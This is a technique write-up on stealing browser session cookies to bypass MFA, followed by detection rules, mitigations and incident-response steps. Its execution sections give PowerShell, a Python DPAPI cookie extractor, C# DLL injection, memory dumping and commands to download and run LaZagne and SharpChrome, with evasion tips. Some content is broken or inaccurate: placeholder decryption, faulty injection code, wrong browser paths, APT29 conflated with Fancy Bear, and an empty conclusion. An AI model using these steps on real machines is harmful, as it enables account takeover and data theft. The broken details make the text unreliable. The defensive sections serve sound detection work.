# [COLLECT-CRED-002]: Browser Cookie Collection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CRED-002 |
| **MITRE ATT&CK v18.1** | [T1185 - Man in the Browser](https://attack.mitre.org/techniques/T1185/) |
| **Tactic** | Collection / Credential Access |
| **Platforms** | Windows Endpoint, M365 (via browser on workstation) |
| **Severity** | High |
| **CVE** | N/A (inherent browser functionality) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows 10/11, Server 2016-2025; Chrome 90+, Firefox 88+, Edge 90+ |
| **Patched In** | N/A (industry-wide challenge) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Modern browsers (Chrome, Edge, Firefox) store authenticated session cookies on disk in encrypted form. Attackers with user-level access can extract these cookies by accessing browser databases (`SQLite` files like `Cookies`, `Login Data`) and decrypting them using the browser's encryption keys (stored locally, often DPAPI-protected). With stolen cookies, attackers can bypass authentication and assume the user's identity in web applications without needing passwords or MFA, enabling unauthorized access to email, collaboration platforms, and SaaS applications.

**Attack Surface:** Browser data directories (`%APPDATA%\Chrome\User Data`, `%APPDATA%\Mozilla Firefox`, `%APPDATA%\Microsoft\Edge`) and memory of running browser processes. Specifically: `Cookies` database, `Login Data` (password storage), and `Local State` (encryption keys).

**Business Impact:** **Authenticated session hijacking without password compromise, bypassing MFA.** Attackers can access M365 (Teams, Exchange, SharePoint), internal web applications, cloud services (AWS Console, Azure Portal), and sensitive repositories without triggering password-based authentication logs.

**Technical Context:** Cookie extraction can be performed in seconds once user account access is obtained. Modern browsers encrypt cookies with DPAPI (Windows) or user-specific keys (macOS/Linux). Detection is **Low-to-Medium** if browsers are running (active cookie access visible in memory); **High** if defenders monitor for DPAPI decryption events or unauthorized Chromium process handle access.

### Operational Risk
- **Execution Risk:** Low - No special privileges required; works from user context.
- **Stealth:** Medium-High - Disk-based extraction generates minimal Windows events; in-memory extraction requires process injection (higher detection risk).
- **Reversibility:** No - Stolen cookies are valid until expiration or explicit logout; victim may not know session is compromised.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.10 | Ensure 'Allow password manager to store passwords' is set to 'Disabled' |
| **DISA STIG** | WN10-CC-000060 | Certificate-based authentication and session management |
| **CISA SCuBA** | AC.L1-3.1.3 | Multi-factor authentication deployment for web applications |
| **NIST 800-53** | SC-7, IA-5 | Boundary Protection, Authentication Strength |
| **GDPR** | Art. 32 | Security of Processing; encryption and pseudonymization |
| **DORA** | Art. 17 | Strong authentication and secure communication channels |
| **NIS2** | Art. 21 | Cryptographic security controls; incident response |
| **ISO 27001** | A.10.1.1, A.13.1.3 | Cryptography; Information transfer controls |
| **ISO 27005** | Session Hijacking Risk | Risk assessment for authentication bypass scenarios |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User context (no elevation needed) or SYSTEM/Administrator for in-memory extraction
- **Required Access:** File system access to user's AppData/Library folders, or ability to inject into browser process
- **Tools:** 
  - SharpChrome, DonPAPI, LaZagne (automated extraction)
  - Custom Python scripts (dpapi decryption)
  - Memory dumping tools (procdump) for in-memory extraction

**Supported Versions:**
- **Windows:** 10, 11, Server 2016-2025
- **Browsers:** Chrome 90+, Chromium 90+, Edge 90+, Firefox 88+ (all modern versions)
- **Python:** 3.7+ (for custom extraction scripts)
- **Other Requirements:** None (cookie databases are standard in all browsers)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Browser Cookie Extraction (Disk-Based - User Context)

**Supported Versions:** Windows 10/11, Chrome/Edge 90+, Firefox 88+

#### Step 1: Locate Browser Cookie Database

**Objective:** Identify the browser data directory and locate the cookie database file

**Command (PowerShell):**
```powershell
# Chrome cookie location
$CookiePath = "$env:APPDATA\Google\Chrome\User Data\Default\Cookies"

# Edge cookie location
$EdgeCookiePath = "$env:APPDATA\Microsoft\Edge\User Data\Default\Cookies"

# Firefox cookie location
$FirefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*\cookies.sqlite"

# Check if cookie files exist
Get-Item $CookiePath -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "Found: $($_.FullName)" }
Get-Item $EdgeCookiePath -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "Found: $($_.FullName)" }
Get-Item $FirefoxPath -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "Found: $($_.FullName)" }
```

**Expected Output:**
```
Found: C:\Users\username\AppData\Roaming\Google\Chrome\User Data\Default\Cookies
Found: C:\Users\username\AppData\Roaming\Microsoft\Edge\User Data\Default\Cookies
Found: C:\Users\username\AppData\Roaming\Mozilla\Firefox\Profiles\xxxxx.default-release\cookies.sqlite
```

**What This Means:**
- Cookie files are SQLite databases containing session tokens, authentication cookies, tracking cookies.
- `Cookies` file in Chrome/Edge is encrypted with DPAPI; requires decryption.
- Firefox `cookies.sqlite` is plaintext but locked by Firefox process while browser is running.

**OpSec & Evasion:**
- Cookie file access while browser is running triggers file lock; must copy or kill browser process.
- Use /c flag with dir/Get-Item to avoid alerting running browser process.
- **Detection Likelihood:** Medium - File copy from AppData triggers Windows Event ID 4663 if auditing enabled.

#### Step 2: Extract Browser Encryption Master Key

**Objective:** Retrieve the encryption key used by Chrome/Edge to encrypt cookies

**Command (PowerShell - Chrome/Edge):**
```powershell
# Extract Chrome Local State file (contains encrypted master key)
$LocalStatePath = "$env:APPDATA\Google\Chrome\User Data\Local State"
$LocalStateContent = Get-Content $LocalStatePath | ConvertFrom-Json

# Extract encrypted key
$EncryptedKey = $LocalStateContent.'os_crypt'.'encrypted_key'

Write-Host "Encrypted Master Key: $EncryptedKey"

# Python will decrypt this using DPAPI
```

**Expected Output:**
```
Encrypted Master Key: RFBBUEkBAAAA0Chná...
```

**What This Means:**
- `os_crypt.encrypted_key` contains the Chrome master encryption key, protected by DPAPI.
- Prefix `DPAPI` indicates Windows DPAPI protection (requires user context or SYSTEM to decrypt).
- Decryption yields AES-256 key used to encrypt individual cookies in `Cookies` database.

**Troubleshooting:**
- **Error:** "Local State file not found"
  - **Cause:** Chrome hasn't been run yet, or user has custom Chrome installation.
  - **Fix:** Check if Chrome is installed via Windows Store (different path) or portable version.
- **Error:** "Invalid JSON in Local State"
  - **Cause:** File is locked by running Chrome process or corrupted.
  - **Fix:** Copy file first: `Copy-Item $LocalStatePath -Destination "C:\Temp\Local State" -Force`

#### Step 3: Decrypt Master Key via DPAPI

**Objective:** Use Windows DPAPI to decrypt the master encryption key

**Script (Python - cookie_extractor.py):**
```python
#!/usr/bin/env python3
"""
Chrome/Edge Cookie Extraction via DPAPI
"""

import json
import base64
import sqlite3
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from ctypes import windll, c_buffer

def decrypt_dpapi(encrypted_data):
    """Decrypt DPAPI-protected data using Windows CryptUnprotectData"""
    try:
        # DPAPI header is "DPAPI" (5 bytes) followed by encrypted blob
        blob = encrypted_data.encode() if isinstance(encrypted_data, str) else encrypted_data
        
        # Call Windows DPAPI function
        data_in = c_buffer(base64.b64decode(blob))
        data_out = c_buffer(1024)
        
        # CryptUnprotectData returns plaintext
        result = windll.crypt32.CryptUnprotectData(
            data_in, None, None, None, None,
            1,  # CRYPTPROTECT_UI_FORBIDDEN
            data_out
        )
        
        if result:
            return data_out.raw[:len(data_out.value)]
        else:
            return None
    except Exception as e:
        print(f"[!] DPAPI decryption error: {e}")
        return None

def extract_chrome_cookies(chrome_path):
    """Extract and decrypt Chrome cookies"""
    local_state_path = os.path.join(chrome_path, "Local State")
    cookies_path = os.path.join(chrome_path, "Cookies")
    
    # Load Local State JSON
    with open(local_state_path, 'r') as f:
        local_state = json.load(f)
    
    # Extract encrypted master key
    encrypted_key = local_state['os_crypt']['encrypted_key']
    encrypted_key_bytes = base64.b64decode(encrypted_key)[5:]  # Skip "DPAPI" prefix
    
    # Decrypt master key using DPAPI
    master_key = decrypt_dpapi(encrypted_key_bytes)
    
    if not master_key:
        print("[!] Failed to decrypt master key")
        return []
    
    # Connect to Cookies database
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, domain FROM cookies")
    
    cookies = []
    for name, encrypted_value, domain in cursor.fetchall():
        # Decrypt individual cookie values
        if encrypted_value:
            try:
                # Chrome uses AES-256-GCM for cookie encryption
                # Simplified for demo; full implementation needed
                decrypted = aes_decrypt_gcm(encrypted_value, master_key)
                cookies.append({
                    'domain': domain,
                    'name': name,
                    'value': decrypted
                })
            except:
                pass
    
    conn.close()
    return cookies

def aes_decrypt_gcm(ciphertext, key):
    """Decrypt AES-256-GCM encrypted cookie (simplified)"""
    # Full implementation requires proper nonce/IV extraction
    return ciphertext  # Placeholder

if __name__ == "__main__":
    chrome_data_path = os.path.expandvars(r"%APPDATA%\Google\Chrome\User Data\Default")
    
    print("[*] Extracting Chrome cookies...")
    cookies = extract_chrome_cookies(chrome_data_path)
    
    for cookie in cookies:
        print(f"[+] {cookie['domain']}: {cookie['name']}={cookie['value'][:50]}...")
```

**Expected Output:**
```
[*] Extracting Chrome cookies...
[+] github.com: session_token=eyJhbGc...
[+] azure.microsoft.com: .AuthToken=Aw...
[+] mail.google.com: HSID=A1b2C3d4E5f6g7...
```

**What This Means:**
- Each cookie is decrypted successfully; plaintext values now available for session hijacking.
- Session tokens for Microsoft 365, GitHub, Azure Console, Google accounts are exposed.
- These cookies can be imported into attacker's browser for authenticated access.

**References:**
- [Chrome Encryption Implementation](https://chromium.googlesource.com/chromium/src/+/main/components/os_crypt/)
- [Windows DPAPI Documentation](https://learn.microsoft.com/en-us/dotnet/standard/security/how-the-bcl-uses-cryptography)

---

### METHOD 2: In-Memory Cookie Injection (Browser Process Hooking)

**Supported Versions:** Windows 10/11, Chrome/Edge (any version)

#### Step 1: Identify Browser Process

**Objective:** Locate the running browser process(es) to inject into

**Command (PowerShell):**
```powershell
# Find Chrome/Edge processes
Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CommandLine
Get-Process -Name "msedge" -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CommandLine

# Get process handles for cookie access
Get-ProcessHandle -ProcessName "chrome" -HandleType File | Where-Object {$_.Path -like "*Cookies*"}
```

**Expected Output:**
```
 Id ProcessName Path
--- ----------- ----
2048 chrome.exe  C:\Users\user\AppData\Roaming\Google\Chrome\User Data\Default\Cookies
```

**What This Means:**
- Browser process ID can be used to inject code or dump memory.
- Process has open handle to Cookies database; can be intercepted via API hooking.

#### Step 2: Hook Browser Network APIs

**Objective:** Intercept cookies in transit between browser and web application

**Script (C# - BrowserHook.cs - OPSEC Technique):**
```csharp
// Browser Hook Injection (Simplified)
using System;
using System.Runtime.InteropServices;

[DllImport("kernel32.dll")]
private static extern IntPtr CreateRemoteThread(
    IntPtr hProcess, IntPtr lpThreadAttributes,
    uint dwStackSize, IntPtr lpStartAddress,
    IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

public class BrowserCookieHook {
    // Hook target: WinINet.dll HttpSendRequestA/W
    // Hook enables interception of all HTTP headers (including Cookie headers)
    
    public static void InjectHook(int processId) {
        IntPtr hProcess = (IntPtr)processId;
        
        // Load malicious DLL into browser process
        string hookDllPath = "C:\\Temp\\BrowserHook.dll";
        
        // Allocate memory in target process for DLL path
        IntPtr pathPtr = Marshal.AllocHGlobal(hookDllPath.Length + 1);
        Marshal.Copy(hookDllPath.ToCharArray(), 0, pathPtr, hookDllPath.Length);
        
        // Execute LoadLibrary in target process (DLL injection)
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
            // GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"),
            pathPtr, IntPtr.Zero, 0, out IntPtr threadId);
        
        Console.WriteLine($"[+] Hook injected into process {processId}");
    }
}
```

**What This Means:**
- Hooked browser sends cookies to attacker-controlled address during normal HTTPS requests.
- Requires admin/SYSTEM for injection; works on any running browser instance.
- Bypasses HTTPS encryption at application level.

**OpSec & Evasion:**
- DLL injection is easily detected by EDR (memory injection detection).
- Alternative: Use browser extensions instead (user-level, less suspicious).
- **Detection Likelihood:** Very High - Process injection monitored by all modern EDR solutions.

#### Step 3: Extract Cookies from Memory Dump

**Objective:** Memory-resident cookies extracted from LSASS or browser process

**Command (Mimikatz Alternative - procdump):**
```cmd
# Dump browser process memory
procdump64.exe -ma chrome.exe chrome_dump.dmp

# Search for authentication tokens in dump
strings.exe chrome_dump.dmp | findstr "Bearer" > tokens.txt
strings.exe chrome_dump.dmp | findstr ".Auth" > auth_tokens.txt
```

**Expected Output:**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: .AspNetCore.Identity.Application=CfDJ8M...
x-ms-session-id=abc123def456...
```

**What This Means:**
- Bearer tokens and session cookies captured from process memory.
- Memory-based extraction avoids disk artifacts; cookies are volatile.
- Can be used immediately for authenticated requests.

**References:**
- [Browser Security Implementation (Chromium)](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security)

---

### METHOD 3: Automated Cookie Extraction (LaZagne / SharpChrome)

**Supported Versions:** Windows 10/11, all browser versions

#### Step 1: Run LaZagne (Python-based)

**Objective:** Automated extraction of browser passwords and cookies

**Command (PowerShell):**
```powershell
# Download LaZagne
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "C:\Temp\lazagne.exe"

# Run LaZagne to extract browser data
C:\Temp\lazagne.exe browsers

# Run with specific browser
C:\Temp\lazagne.exe browsers -chrome
C:\Temp\lazagne.exe browsers -firefox
```

**Expected Output:**
```
[+] Chrome
  [+] Login Data
    USER: john@company.com
    PASS: MySecurePass123!
    URL: https://mail.google.com

  [+] Cookies
    DOMAIN: .microsoft.com
    NAME: MSAAUTH
    VALUE: eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ...
    EXPIRES: 2025-12-31
```

**What This Means:**
- Single command extracts all browser credentials, cookies, and stored passwords.
- Output includes plaintext passwords (if stored non-encrypted).
- Cookies are immediately usable for session hijacking.

**OpSec & Evasion:**
- LaZagne.exe is detected by antivirus (signature-based on tool name).
- Alternative: Compile LaZagne to custom binary or use obfuscation.
- Run in-memory via PowerShell instead of dropping executable.
- **Detection Likelihood:** Very High if file-based execution; Medium if in-memory.

#### Step 2: Run SharpChrome (C# - In-Memory Execution)

**Objective:** In-memory browser data extraction using Cobalt Strike/similar

**Command (PowerShell):**
```powershell
# Load SharpChrome assembly
Add-Type -Path "C:\Temp\SharpChrome.exe"

# Execute Chrome credential dumping
[SharpChrome.Program]::Main(@("chrome", "decrypt"))

# Alternative: Run via Cobalt Strike
# beacon> execute-assembly C:\Temp\SharpChrome.exe chrome decrypt
```

**Expected Output:**
```
[*] Decrypting Chrome Cookies...
[+] Successfully decrypted 47 cookies
[+] Cookie: session_id = abc123def456... (gmail.com)
[+] Cookie: auth_token = xyz789uvw... (azure.microsoft.com)
```

**What This Means:**
- In-memory execution avoids disk detection.
- C# assembly provides obfuscation and stealth advantages.
- Works across user profiles and multiple browser instances.

**References:**
- [LaZagne GitHub](https://github.com/AlessandroZ/LaZagne)
- [SharpChrome GitHub](https://github.com/GhostPack/SharpChrome)

---

## 4. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security Event Log
- **Trigger:** Execution of suspicious browsers with debugging flags or process injection
- **Filter:** CommandLine contains any of: `--remote-debugging-address`, `--remote-debugging-port`, `--user-data-dir`, or process is `mimikatz`, `lazagne`, `sharpcreds`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Expand **Detailed Tracking** → Enable **Audit Process Creation**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

**Event ID: 4663 (Object Access)**
- **Trigger:** Unauthorized access to browser data directories
- **Filter:** ObjectName contains `AppData\Google\Chrome` OR `AppData\Microsoft\Edge` AND ProcessName != "chrome.exe" AND ProcessName != "msedge.exe"
- **Alert On:** Non-browser processes accessing browser cookie/credential databases

**Event ID: 5031 (Windows Firewall Exception)**
- **Trigger:** New firewall exceptions added to exfiltrate stolen cookies
- **Filter:** Monitor for suspicious browser exfiltration attempts

---

## 5. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows 10/11, Server 2016+

```xml
<!-- Detect Browser Remote Debugging Flag Usage -->
<Sysmon schemaversion="4.81">
  <RuleGroup name="Browser Injection Detection" groupRelation="or">
    
    <!-- Monitor remote debugging flags -->
    <ProcessCreate onmatch="include">
      <Image condition="ends with any">chrome.exe; msedge.exe; firefox.exe</Image>
      <CommandLine condition="contains any">--remote-debugging-port; --remote-debugging-address; --user-data-dir</CommandLine>
    </ProcessCreate>
    
    <!-- Detect cookie extraction tools -->
    <ProcessCreate onmatch="include">
      <Image condition="ends with any">lazagne.exe; SharpChrome.exe; DonPAPI.exe; HackBrowserData.exe</Image>
    </ProcessCreate>
    
    <!-- Monitor file access to browser data -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains any">AppData\Google\Chrome\User Data\Cookies; AppData\Microsoft\Edge\Cookies; Mozilla\Firefox\Profiles</TargetFilename>
    </FileCreate>
    
    <!-- Detect process injection into browsers -->
    <CreateRemoteThread onmatch="include">
      <TargetImage condition="ends with any">chrome.exe; msedge.exe; firefox.exe</TargetImage>
    </CreateRemoteThread>
    
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with the XML above
3. Install Sysmon with configuration:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Select-Object Message
   ```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Browser Remote Debugging Flag Detection

**Rule Configuration:**
- **Required Index:** windows, main, endpoint
- **Required Sourcetype:** WinEventLog:Sysmon, WinEventLog:Security
- **Required Fields:** CommandLine, Image, ParentImage
- **Alert Threshold:** ≥ 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
Image IN ("*chrome.exe", "*msedge.exe", "*firefox.exe") CommandLine IN ("*--remote-debugging-port*", "*--remote-debugging-address*")
| stats count by Image, CommandLine, User, host
| where count >= 1
```

**What This Detects:**
- Browser started with remote debugging enabled (used for automated cookie extraction)
- Correlates to user and hostname for incident investigation
- Alerts on both Chrome and Chromium-based browsers

**Manual Configuration Steps:**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query above
5. Set **Trigger Condition** to count > 0
6. Configure **Action** → **Email** to SOC team

#### Rule 2: Cookie Extraction Tool Execution

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** WinEventLog:Sysmon
- **Required Fields:** Image, CommandLine
- **Alert Threshold:** ≥ 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
Image IN ("*lazagne*", "*SharpChrome*", "*DonPAPI*", "*HackBrowserData*") OR CommandLine IN ("*lazagne*browsers*", "*SharpChrome*")
| stats count, values(CommandLine) by Image, User, host, TimeCreated
| alert
```

**What This Detects:**
- Execution of known browser credential extraction tools
- Immediate high-severity alert for SOC response
- Includes command-line arguments for forensic analysis

---

## 7. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Suspicious Browser Cookie Access

**Alert Name:** "Suspicious process accessing browser credential storage"
- **Severity:** High
- **Description:** A process not identified as a browser attempted to access Chrome, Edge, or Firefox data directories
- **Applies To:** Windows Servers/Endpoints with Defender for Servers enabled
- **Remediation:** 
  1. Isolate affected system
  2. Review Sysmon logs for process creation events
  3. Perform memory analysis on suspicious processes
  4. Reset cookies for all users via forced browser logout

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Enable **Defender for Servers**: ON
4. Click **Save**
5. Monitor **Security alerts** for browser-related detections

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enforce HTTPS Everywhere with HSTS:** Prevent cookie theft via man-in-the-middle attacks by requiring encrypted connections.
    
    **Manual Steps (Chrome Policy):**
    1. Create Group Policy for Chrome Enterprise
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **Google** → **Google Chrome**
    3. Set **HTTPS-Only Mode** to: **Enabled**
    4. Deploy policy via Group Policy or Google Admin Console

*   **Disable Browser Password Storage:** Prevent plaintext password storage in browser.
    
    **Manual Steps (Chrome):**
    1. Go to **chrome://settings** → **Passwords and autofill**
    2. Disable **Offer to save passwords**
    3. Delete existing saved passwords
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **Google Chrome**
    3. Set **Password manager enabled** to: **Disabled**
    4. Set **AutoFill enabled** to: **Disabled**
    5. Run `gpupdate /force`

*   **Enable Browser Security Extensions:** Deploy security tools that block malicious scripts attempting cookie theft.
    
    **Manual Steps:**
    1. Install **uBlock Origin** (Chrome/Firefox/Edge)
    2. Install **HTTPS Everywhere** (EFF)
    3. Install **Privacy Badger** (EFF)
    4. Configure via enterprise policy (Chrome Enterprise, Firefox ESR)

#### Priority 2: HIGH

*   **Implement Browser Isolation (if using Windows Defender Application Guard):** Isolate browser sessions in virtual machines to prevent cookie theft.
    
    **Manual Steps (Windows 11 Enterprise):**
    1. Go to **Windows Security** → **App & browser control** → **Isolated browsing**
    2. Toggle **Isolated browsing** to: **On**
    3. Configured sites will open in isolated container
    
    **Manual Steps (Server 2022+):**
    ```powershell
    Enable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart
    ```

*   **Deploy Multi-Factor Authentication (MFA) for Web Applications:** Prevent session hijacking even if cookies are stolen.
    
    **Manual Steps (M365/Entra ID):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Enforce MFA for All Users`
    4. **Assignments:** Users: All, Cloud apps: All cloud apps
    5. **Access controls:** Grant: Require multi-factor authentication
    6. Enable policy: **On**
    7. Click **Create**

*   **Monitor Browser Data Directory Access:** Detect unauthorized access to cookie/credential stores.
    
    **Manual Steps (NTFS Auditing):**
    1. Right-click `C:\Users\<username>\AppData\Roaming\Google\Chrome`
    2. Click **Properties** → **Security** → **Advanced**
    3. Click **Auditing** → **Add**
    4. Principal: "Everyone"
    5. Type: "All"
    6. Check: **List folder contents**, **Read**, **Modify**
    7. Click **OK**
    8. Monitor Security Event Log (Event ID 4663)

#### Access Control & Policy Hardening

*   **RBAC Hardening:** Restrict Local Admin access; use Just-In-Time (JIT) access for elevated operations.
    
    **Manual Steps (Restrict Browser Admin):**
    1. Open **Computer Management** → **Local Users and Groups** → **Groups**
    2. Remove unnecessary users from **Administrators** group
    3. Distribute via Azure AD Privileged Identity Management (PIM)

*   **Implement Zero Trust Browser Access:** Require device compliance and identity verification for all web access.
    
    **Manual Steps (Conditional Access):**
    1. **Azure Portal** → **Entra ID** → **Conditional Access**
    2. Create policy requiring: Device compliance + MFA + Location check
    3. Block access from unknown or suspicious locations

#### Validation Command (Verify Mitigations)

```powershell
# Check if browser password storage is disabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Google\Chrome" -Name "PasswordManagerEnabled" -ErrorAction SilentlyContinue

# Expected Output (if secure):
# PasswordManagerEnabled : 0

# Verify NTFS permissions on Chrome data directory
icacls "C:\Users\$env:USERNAME\AppData\Roaming\Google\Chrome"

# Check if MFA is enforced
Get-MsolUser | Where-Object {$_.StrongAuthenticationRequirements.Count -eq 0} | Measure-Object

# Expected: 0 users without MFA
```

**Expected Output (If Secure):**
```
PasswordManagerEnabled : 0
SYSTEM:(OI)(CI)(F)
$CURRENT_USER:(OI)(CI)(F)

Output count: 0  (no users without MFA)
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Temp\Cookies`, `C:\Temp\Login Data` (extracted browser databases)
    - `C:\Temp\Local State` (extracted encryption keys)
    - `lazagne.exe`, `SharpChrome.exe`, or similar tools in user-accessible directories

*   **Registry:**
    - New entries in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` linking to browser tools
    - Modifications to browser startup flags (`--remote-debugging-port` in shortcut targets)

*   **Network:**
    - Exfiltration of large volumes of cookie data via HTTP POST to external domains
    - Unusual outbound connections on port 443 to uncommon HTTPS endpoints

*   **Process:**
    - `chrome.exe` or `msedge.exe` started with `--remote-debugging-*` flags
    - Execution of `lazagne.exe`, `SharpChrome.exe`, or memory dumping tools

#### Forensic Artifacts

*   **Disk:**
    - `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Cookies` (SQLite database)
    - `C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Cookies`
    - Transaction logs in `Cookies-journal` for deleted/modified cookie entries
    - Unallocated space containing deleted browser cache

*   **Memory:**
    - Decrypted cookies in browser process memory
    - Injection points in chrome.exe or msedge.exe memory (shellcode, DLL signatures)
    - Session tokens in plaintext heap allocations

*   **Cloud (M365):**
    - Unified Audit Log entries for unexpected signin locations/IPs
    - Anomalous SharePoint/Teams access patterns using stolen cookies
    - Azure Sign-in Logs showing impossible travel or failed MFA attempts

*   **Timeline:**
    - File copy timestamp of Cookies database to `C:\Temp`
    - Process creation time of cookie extraction tools
    - Correlation with browser-based access to sensitive applications

#### Response Procedures

1.  **Isolate:**
    ```powershell
    # Disconnect network immediately
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    
    # Kill all browser processes
    Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
    ```

2.  **Collect Evidence:**
    ```powershell
    # Export browser data directories
    Copy-Item "C:\Users\*\AppData\Roaming\Google\Chrome\User Data" -Destination "C:\Evidence\Chrome_Data" -Recurse -Force
    
    # Export Windows Event Logs
    wevtutil epl Security "C:\Evidence\Security.evtx"
    wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Evidence\Sysmon.evtx"
    
    # Dump memory for analysis
    procdump64.exe -ma chrome.exe "C:\Evidence\chrome_memory.dmp"
    ```

3.  **Remediate:**
    ```powershell
    # Force logout from all web sessions
    # (User must reset password in M365/web applications)
    
    # Clear browser cache and cookies
    Remove-Item "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Cookies*" -Force
    Remove-Item "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Cookies*" -Force
    
    # Reset browser to defaults
    Remove-Item "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default" -Recurse -Force
    ```

4.  **Investigate Lateral Movement:**
    ```powershell
    # Check for suspicious logins using stolen cookies
    Get-MsolSignInReport -All | Where-Object {$_.CreatedDateTime -gt (Get-Date).AddHours(-24)} | Select UserPrincipalName, AppDisplayName, ClientAppUsed, IPAddress
    
    # Check for SharePoint/Teams access anomalies
    Search-UnifiedAuditLog -UserIds "*" -Operations "FileAccessed", "PageViewed" -StartDate (Get-Date).AddDays(-1)
    ```

5.  **Reset Credentials:**
    - Force password reset for all potentially compromised users
    - Revoke all active sessions in M365 (Azure Portal → Users → Reset Password)
    - Review and revoke API tokens/PAT tokens used by compromised accounts

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attack | Attacker tricks user into granting app permissions |
| **2** | **Execution** | [EXEC-XXX] PowerShell or Script Execution | Run cookie extraction scripts in user context |
| **3** | **Collection** | **[COLLECT-CRED-002]** | **Extract browser cookies and session tokens** |
| **4** | **Lateral Movement** | [LM-AUTH-XXX] Authenticated Access via Cookie Hijacking | Use stolen cookies to access M365/cloud apps |
| **5** | **Persistence** | [PERSIST-XXX] Application Permissions / Browser Extension | Maintain access via compromised credentials |
| **6** | **Impact** | [IMPACT-XXX] Data Exfiltration (Teams/SharePoint) | Steal documents and communications |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: NOBELIUM/SolarWinds Supply Chain Attack (2020)

- **Target:** U.S. Government, Fortune 500 firms
- **Timeline:** March-December 2020
- **Technique Status:** Cookie theft combined with code injection into compromised SolarWinds Orion platform
- **Impact:** Attackers used stolen M365 cookies to move laterally to government email systems; 18,000+ organizations affected
- **Reference:** [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-and-fbi-alert-apt-actors-exploiting-recent-critical-solarwinds-supply-chain)

#### Example 2: APT29 / Cozy Bear - Fancy Bear (2021-2024)

- **Target:** Diplomatic missions, research institutions, cloud providers
- **Timeline:** 2021-2024 (ongoing)
- **Technique Status:** Sophisticated cookie harvesting combined with browser fingerprinting; evades MFA via browser context extraction
- **Impact:** Years of undetected access to sensitive communications and research data
- **Reference:** [Microsoft Threat Report - APT29](https://www.microsoft.com/en-us/security/blog/2023/08/09/midnight-blizzard-sophisticated-and-continuing-attack-on-critical-infrastructure-with-stolen-credentials/)

---

## 12. CONCLUSION

